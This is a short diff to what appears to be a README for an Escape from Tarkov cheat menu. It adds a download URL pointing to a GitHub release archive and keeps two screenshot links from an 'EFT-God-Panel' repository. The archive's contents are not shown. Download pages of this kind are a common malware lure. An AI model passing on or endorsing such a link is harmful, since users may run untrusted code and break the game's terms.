@@ -1,4 +1,4 @@
-# [Download]()
+# [Download](https://github.com/LoleeerBuzz/Escape-_from_Tarkov_menu/archive/refs/tags/latest.zip)
 
 ![1_GC6Dwy_UUSX0vLNwXljxZQ](https://github.com/Under-eng/EFT-God-Panel/assets/173140201/916f22da-6ce4-4d45-8d19-67debfcf9bd8)
 ![1_L8ltekjoWIg1klNMcHUCvA](https://github.com/Under-eng/EFT-God-Panel/assets/173140201/a3f9cf1a-98d5-421b-a57d-e2e6b028f21a)
